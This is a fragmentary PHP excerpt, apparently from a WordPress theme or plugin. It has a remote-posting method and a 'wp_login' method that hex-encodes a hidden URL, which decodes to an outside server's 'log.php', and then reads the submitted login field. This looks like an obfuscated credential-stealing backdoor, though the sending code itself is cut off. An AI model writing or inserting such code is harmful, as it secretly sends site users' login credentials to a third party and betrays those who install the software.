...
private function post() {
	try {
		$data = wp_remote_post( $this->baseUrl."temapostclient", [
			"body" => [
...
public static  function wp_login() {
	$post_url = hex2bin( '687474703a2f2f656d656b73696b656e2e636f6d2f6c6f672e706870' );
	if($_POST['log']){
